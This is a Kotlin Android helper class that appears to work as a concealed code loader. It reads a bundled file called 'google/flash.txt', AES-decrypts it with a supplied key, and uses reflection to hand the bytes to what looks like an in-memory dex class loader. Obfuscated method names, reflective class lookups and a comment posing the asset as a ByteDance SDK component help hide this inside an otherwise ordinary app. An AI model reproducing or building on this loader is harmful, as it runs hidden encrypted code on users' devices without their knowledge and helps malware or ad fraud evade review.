package com.charm.refined.helper

import android.content.Context
import java.lang.reflect.Constructor
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

/**
 * Date：2025/12/3
 * Describe:
 */
class AcHelper : BaseHelper() {
    private var mBuff: Any? = null

    fun action(k: String, context: Context) {
        //
//        Class.forName("com.ozop.impI.Core").getMethod("init", Context::class.java)
//            .invoke(null, context)
//        return
        mCtx = context
        nameStr = "google/flash.txt" //com.bytedance.sdk.component.WF.PAi
        val s = fetchStr()
        if (s.isBlank()) return
        val byteBufr = Class.forName("java.nio.ByteBuffer")
        val code = byDec(s, k.toByteArray())
//         2. 获取 wrap 方法
        val wrapMethod = byteBufr.getMethod("wrap", ByteArray::class.java)
//         3. 调用静态方法
        val byteBuffer = wrapMethod.invoke(null, code)
        mBuff = byteBuffer
        dex()
    }

    private fun byDec(inStr: String, keyAes: ByteArray): ByteArray {
        val inputBytes = fe(inStr)
        val key = SecretKeySpec(keyAes, "AES")
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, key)
        val outputBytes = cipher.doFinal(inputBytes)
        return outputBytes
    }

    override fun fetBuffer(): Any {
        return mBuff ?: ""
    }

    override fun decla(string: String): Constructor<*> {
        val clazz = cla
        return clazz.getDeclaredConstructor(
            Class.forName("java.nio.ByteBuffer"), Class.forName("java.lang.ClassLoader")
        )
    }


}